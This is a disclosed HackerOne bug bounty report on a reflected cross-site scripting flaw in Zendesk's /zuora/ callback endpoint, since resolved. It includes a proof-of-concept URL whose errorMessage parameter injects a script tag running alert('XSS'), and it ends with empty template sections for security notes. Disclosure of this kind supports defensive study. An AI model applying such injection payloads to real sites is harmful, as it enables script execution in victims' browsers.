---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '134434'
original_report_id: '134434'
title: XSS In /zuora/ functionality
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zendesk
created_at: '2016-04-25T17:02:12.452Z'
disclosed_at: '2016-05-24T15:35:31.199Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS In /zuora/ functionality

## Metadata

- HackerOne Report ID: 134434
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zendesk
- Disclosed At: 2016-05-24T15:35:31.199Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Hello there,
I wanted to report a XSS vulnerability in the /zuora/ functionality on the zendesk application.
Affected URL: 
- https://anysubdomain.zendesk.com/zuora/callback/callback?id=&tenantId=&timestamp=&token=&responseSignature=&success=false&errorCode=GatewayTransactionError&errorMessage=Transaction%20declined.015%20-%20No%20Such%20Issuertest%3C/script%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E&field_passthrough2=&field_passthrough1=&field_passthrough3=&signature=

The "anysubdomain" means literally any sub domain except the main one (www).


To reproduce:
1) Open the affected URL.

Please also re-check the report #132049. It shouldn't be closed! is a High Risk CSRF that can delete an entire application. Please re-check it ASAP. Test the PoC provided.

Kind Regards,
Alex.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
